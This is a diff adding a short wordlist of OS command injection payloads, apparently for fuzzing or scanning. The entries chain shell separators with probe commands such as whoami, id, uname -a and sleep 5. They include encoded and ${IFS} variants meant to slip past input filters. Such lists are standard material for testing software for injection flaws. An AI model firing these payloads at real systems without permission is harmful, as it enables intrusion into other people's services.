@@ -1,0 +1,39 @@
+; echo VULN
+&& echo VULN
+| echo VULN
+; whoami
+; id
+; uname -a
+; sleep 5
+&& sleep 5
+| sleep 5
+;
+&&
+|
+||
+`
+$()
+>
+<
+;echo VULN
+&&echo VULN
+|echo VULN
+;whoami
+;id
+;uname -a
+;sleep 5
+`whoami`
+$(whoami)
+%3Becho%20VULN
+%26%26whoami
+%7Cecho%20VULN
+;echo${IFS}VULN
+;whoami${IFS}
+%0aecho VULN
+%0awhoami
+;echo VULN&&whoami&&id&&uname -a&&sleep 5
+{echo,VULN}
+{whoami}
+;echo V*
+;who*
+';echo${IFS}VULN&&whoami||sleep${IFS}5#
